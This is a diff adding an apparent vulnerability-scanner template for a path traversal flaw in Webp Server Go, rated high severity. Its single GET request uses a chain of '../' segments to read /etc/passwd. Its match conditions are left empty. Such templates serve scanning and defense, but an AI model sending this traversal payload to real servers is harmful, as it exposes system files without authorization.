@@ -1,0 +1,16 @@
+id: webp-server-lfi
+brief:
+    title: Webp Server Go - Path Traversal
+    by: ritikchaddha
+    level: high
+    about: Webp Server Go has an Path Traversal vulnerability. Attackers can use the vulnerability to access arbitraty file.
+    label:
+        - webp
+        - webp-server
+        - lfi
+        - vuln
+moves:
+    - verb: GET
+      to:
+        - '{{BaseURL}}/../../../../../../../../../../../etc/passwd'
+      signs: []
